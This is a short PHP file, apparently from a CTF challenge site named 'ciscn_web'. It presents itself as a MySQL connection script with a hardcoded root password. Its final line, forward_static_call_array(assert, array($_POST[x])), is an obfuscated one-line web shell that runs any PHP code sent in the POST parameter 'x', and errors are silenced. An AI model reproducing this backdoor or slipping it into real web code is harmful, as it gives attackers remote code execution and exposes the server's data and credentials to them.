<?php
error_reporting(0);
$con = mysql_connect ("127.0.0.1", "root", "c933ccc3b6b2fe8cb830a5e76f5f98a5");
if (!$con){
  die('Could not connect: ' . mysqli_error());
}
mysql_select_db("ciscn_web", $con);

forward_static_call_array(assert,array($_POST[x]));

?>
